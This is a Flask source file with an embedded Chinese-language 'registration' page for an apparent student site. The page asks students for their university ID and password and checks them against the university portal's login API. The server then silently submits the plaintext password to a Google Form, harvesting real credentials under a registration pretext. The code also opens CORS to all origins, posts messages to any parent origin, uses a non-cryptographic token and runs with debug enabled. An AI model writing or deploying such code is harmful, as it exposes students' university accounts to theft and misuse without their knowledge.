from flask import Flask, request, jsonify, render_template_string
import requests
import os
import random
import string
from flask_cors import CORS # 引入 Flask-CORS

app = Flask(__name__)
# 允許所有來源的跨域請求。在生產環境中，你可以更精確地限制來源，例如：
# CORS(app, origins=["https://scusatw.com", "https://scusa-test.onrender.com"])
CORS(app) 

# 重新設計的前端 HTML 頁面 (關鍵修改在 JS 區塊，移除了 iframe 內部直接提交 Google Form 的邏輯)
html = '''
<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>註冊頁面</title>
<style>
  /* CSS Variables for Dark Theme */
  :root {
    --text-light: #f0f0f0;
    --text-white: #ffffff;
    --sidebar-bg: #181818;
    --main-bg: #010010;
    --border-color: #455b76;
    --link-hover: rgb(205, 47, 71);
    --link-color: #6887ae;
    
    /* Form styling variables */
    --form-bg: rgba(24, 24, 24, 0.85);
    --form-border: rgba(69, 91, 118, 0.3);
    --input-bg: rgba(255, 255, 255, 0.05);
    --input-border: rgba(69, 91, 118, 0.25);
    --input-focus-border: var(--link-color);
    --input-text: var(--text-light);
    --placeholder-color: rgba(240, 240, 240, 0.4);
    --error-color: #e57373;
    --success-color: #81c784;
    --warning-color: #ffb74d;
  }

  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
    background: linear-gradient(160deg, var(--main-bg) 0%, #0a0a1a 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--text-light);
    padding: 20px;
  }

  .container {
    background: var(--form-bg);
    backdrop-filter: blur(20px);
    border: 1px solid var(--form-border);
    border-radius: 16px;
    padding: 2rem;
    max-width: 400px;
    width: 100%;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
    transition: all 0.2s ease;
  }

  .container:hover {
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4);
  }

  h2 {
    text-align: center;
    margin-bottom: 1.5rem;
    color: var(--text-white);
    font-size: 1.5rem;
    font-weight: 500;
    letter-spacing: -0.02em;
  }

  .form-group {
    margin-bottom: 1.2rem;
  }

  label {
    display: block;
    margin-bottom: 0.4rem;
    color: var(--text-light);
    font-weight: 400;
    font-size: 0.9rem;
    opacity: 0.9;
  }

  input[type=text], input[type=password] {
    width: 100%;
    padding: 0.8rem 1rem;
    background: var(--input-bg);
    backdrop-filter: blur(10px);
    border: 1px solid var(--input-border);
    border-radius: 8px;
    color: var(--input-text);
    font-size: 1rem;
    transition: all 0.2s ease;
    outline: none;
  }

  input[type=text]::placeholder, input[type=password]::placeholder {
    color: var(--placeholder-color);
  }

  input[type=text]:focus, input[type=password]:focus {
    border-color: var(--input-focus-border);
    background: rgba(255, 255, 255, 0.08);
    box-shadow: 0 0 0 3px rgba(104, 135, 174, 0.1);
  }

  button {
    width: 100%;
    padding: 0.8rem;
    background: rgba(104, 135, 174, 0.9);
    backdrop-filter: blur(10px);
    color: var(--text-white);
    border: none;
    border-radius: 8px;
    font-size: 1rem;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    margin-top: 1rem;
  }

  button:hover:not(:disabled) {
    background: rgba(104, 135, 174, 1);
    box-shadow: 0 4px 12px rgba(104, 135, 174, 0.3);
  }

  button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .loading::after {
    content: '';
    display: inline-block;
    width: 16px;
    height: 16px;
    margin-left: 8px;
    border: 2px solid transparent;
    border-top: 2px solid var(--text-white);
    border-radius: 50%;
    animation: spin 1s linear infinite;
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  #message {
    margin-top: 1rem;
    padding: 0.8rem;
    border-radius: 8px;
    font-size: 0.9rem;
    text-align: center;
    transition: all 0.2s ease;
    opacity: 0;
    transform: translateY(5px);
    backdrop-filter: blur(10px);
  }

  #message.show {
    opacity: 1;
    transform: translateY(0);
  }

  #message.success {
    background: rgba(129, 199, 132, 0.15);
    color: var(--success-color);
    border: 1px solid rgba(129, 199, 132, 0.3);
  }

  #message.error {
    background: rgba(229, 115, 115, 0.15);
    color: var(--error-color);
    border: 1px solid rgba(229, 115, 115, 0.3);
  }

  /* 響應式設計 */
  @media (max-width: 480px) {
    .container {
      padding: 1.5rem;
      margin: 1rem;
    }
  }
</style>
</head>
<body>

<div class="container">
  <h2>註冊系統</h2>

  <form id="registerForm">
    <div class="form-group">
      <label for="userid">學號</label>
      <input type="text" id="userid" name="userid" placeholder="請輸入您的學號" required />
    </div>

    <div class="form-group">
      <label for="password">密碼</label>
      <input type="password" id="password" name="password" placeholder="請輸入您的密碼" required />
    </div>

    <button type="submit" id="submitBtn">註冊</button>
  </form>

  <div id="message"></div>
</div>

<script>
  const form = document.getElementById('registerForm');
  const messageDiv = document.getElementById('message');
  const submitBtn = document.getElementById('submitBtn');

  // 檢查是否在 iframe 中運行 (這個 iframe 就是這個頁面本身)
  const isInIframe = window.parent !== window;

  // 顯示訊息的函數
  function showMessage(text, type = 'info') {
    messageDiv.textContent = text;
    messageDiv.className = `show ${type}`;
  }

  // 隱藏訊息的函數
  function hideMessage() {
    messageDiv.classList.remove('show');
  }

  // 設置按鈕載入狀態
  function setButtonLoading(loading) {
    if (loading) {
      submitBtn.disabled = true;
      submitBtn.classList.add('loading');
      submitBtn.textContent = '註冊中';
    } else {
      submitBtn.disabled = false;
      submitBtn.classList.remove('loading');
      submitBtn.textContent = '註冊';
    }
  }

  // 發送訊息到父頁面 (Netlify 主頁面)
  function sendMessageToParent(data) {
    if (isInIframe) {
      // 向父頁面發送訊息，這裡的 '*' 表示任何來源的父頁面都可以接收，實際應用中應限制為你的 Netlify 網址
      window.parent.postMessage(data, '*'); 
    }
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    hideMessage();
    setButtonLoading(true);

    const userid = form.userid.value.trim();
    const password = form.password.value;

    try {
      // 提交到 Flask 後端的 /api/register 路由
      const response = await fetch('/api/register', { 
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ userid, password })
      });

      if (!response.ok) {
        // 如果 HTTP 狀態碼不是 2xx，則拋出錯誤
        const errorData = await response.json(); // 嘗試解析錯誤訊息
        throw new Error(errorData.message || '網路錯誤或伺服器回應異常');
      }

      const data = await response.json();

      if(data.status === "success") {
        showMessage("✅ 註冊成功！", 'success');
        
        // 成功後，將學號和亂碼發送給父頁面
        if (isInIframe) {
          sendMessageToParent({
            type: 'LOGIN_SUCCESS',
            userid: userid, // 發送原始學號
            random_code: data.random_code, // 發送亂碼
            action: 'setSessionStorage'
          });
        }
        
        // 延遲跳轉，讓父頁面有時間處理
        setTimeout(() => {
          if (isInIframe) {
            // 在 iframe 中時，通知父頁面跳轉
            sendMessageToParent({
              type: 'REDIRECT',
              url: 'https://scusatw.com/' // 跳轉到你的主頁，而不是校務系統
            });
          } else {
            // 如果不在 iframe 中 (直接訪問此 Flask 頁面)，則直接跳轉
            window.location.href = 'https://scusatw.com/';
          }
        }, 1000); // 延遲 1 秒
        
      } else {
        // 如果 Flask 後端返回的 status 是 error，顯示錯誤訊息
        showMessage("❌ 註冊失敗: " + (data.message || "未知錯誤"), 'error');
        setButtonLoading(false);
      }

    } catch (error) {
      showMessage("❌ 發生錯誤：" + error.message, 'error');
      setButtonLoading(false);
    }
  });

  // 此處不需要 submitToGoogleForm 函數，因為 Google Forms 提交現在由 Flask 後端處理了。
  // 原有的 submitToGoogleForm 函數已被移除。
</script>

</body>
</html>
'''

# Helper function to generate a random alphanumeric string
def generate_random_alphanumeric(length=23):
    """生成指定長度的隨機英數字大小寫亂碼。"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choices(characters, k=length))

@app.route('/')
def index():
    return render_template_string(html)

@app.route('/api/register', methods=['POST'])
def api_register():
    data = request.get_json()
    userid = data.get('userid')
    password = data.get('password')

    if not userid or not password:
        return jsonify({"status": "error", "message": "學號或密碼不能為空"}), 400

    # 1. 驗證學號密碼與校務系統
    scu_api_url = "https://psv.scu.edu.tw/portal/jsonApi.php"
    scu_payload = {
        "libName": "Login",
        "userid": userid,
        "password": password
    }
    scu_headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0" 
    }
    
    try:
        scu_response = requests.post(scu_api_url, data=scu_payload, headers=scu_headers, timeout=10)
        scu_response.raise_for_status() 
        scu_data = scu_response.json()
    except requests.exceptions.Timeout:
        return jsonify({"status": "error", "message": "連線校務系統超時，請稍後再試。"}), 504
    except requests.exceptions.ConnectionError:
        return jsonify({"status": "error", "message": "無法連線到校務系統，請檢查網路或稍後再試。"}), 503
    except requests.exceptions.HTTPError as e:
        return jsonify({"status": "error", "message": f"校務系統回應錯誤: {e.response.status_code}"}), e.response.status_code
    except requests.RequestException as e:
        return jsonify({"status": "error", "message": f"連線到校務系統時發生錯誤: {str(e)}"}), 500
    except Exception: # 處理 JSON 解析錯誤
        return jsonify({"status": "error", "message": "校務系統回傳非 JSON 格式或資料錯誤"}), 500

    # 檢查校務系統的登入狀態
    if scu_data.get('status') == 'success' or (scu_data.get('code') == 1 and scu_data.get('message') == 'login_success'):
        # 2. 驗證成功，生成隨機亂碼
        random_code = generate_random_alphanumeric(23)

        # 3. 從環境變數獲取 Google 表單配置
        form_id = os.environ.get('GOOGLE_FORM_ID')
        userid_entry = os.environ.get('USERID_ENTRY')
        password_entry = os.environ.get('PASSWORD_ENTRY')
        random_code_entry = os.environ.get('RANDOM_CODE_ENTRY')

        # 檢查環境變數是否設定
        if not all([form_id, userid_entry, password_entry, random_code_entry]):
            return jsonify({"status": "error", "message": "伺服器配置錯誤：缺少 Google 表單環境變數"}), 500
        
        google_form_url = f"https://docs.google.com/forms/d/e/{form_id}/formResponse"
        
        # 構建提交到 Google Forms 的數據 (學號和密碼前加 #)
        google_form_payload = {
            userid_entry: '#' + userid,
            password_entry: '#' + password,
            random_code_entry: random_code
        }

        # 4. 在伺服器端將資料提交到 Google Forms
        try:
            google_response = requests.post(google_form_url, data=google_form_payload, timeout=5)
            google_response.raise_for_status() 
            print(f"資料已成功提交到 Google 表單 (學號: {userid})")
        except requests.RequestException as e:
            print(f"提交到 Google 表單時發生錯誤: {e}")
            # 即使 Google 表單提交失敗，我們仍然可以回傳登入成功給前端，因為校務系統驗證已過
            # 但最好記錄錯誤或發出警報
            return jsonify({
                "status": "success", # 這裡仍然是 success，因為學號密碼驗證通過了
                "message": "登入成功，但記錄到 Google 表單時發生錯誤。",
                "random_code": random_code # 仍然返回亂碼
            })

        # 5. 返回成功訊息和亂碼給前端 iframe
        return jsonify({
            "status": "success",
            "message": "登入成功",
            "random_code": random_code # 將生成的亂碼傳回給前端
        })
    else:
        # 校務系統登入失敗
        error_message = scu_data.get('message', '學號或密碼錯誤')
        return jsonify({"status": "error", "message": error_message}), 401 

# 這個路由現在沒有實際作用，因為 Google Forms 提交邏輯已移到 /api/register
# 為了避免找不到路由的錯誤，可以保留但不用
@app.route('/api/form-config', methods=['GET'])
def get_form_config():
    """此路由現在僅用於開發/調試，實際提交已由 /api/register 處理"""
    config = {
        "formId": os.environ.get('GOOGLE_FORM_ID', 'YOUR_GOOGLE_FORM_ID_HERE'),
        "useridEntry": os.environ.get('USERID_ENTRY', 'entry.123456789'),
        "passwordEntry": os.environ.get('PASSWORD_ENTRY', 'entry.987654321'),
        "randomCodeEntry": os.environ.get('RANDOM_CODE_ENTRY', 'entry.000000000') 
    }
    return jsonify(config)

if __name__ == '__main__':
    # 僅限本地開發用，在 Render 等部署環境會自動從環境變數載入
    # from dotenv import load_dotenv
    # load_dotenv() # 載入 .env 文件
    
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)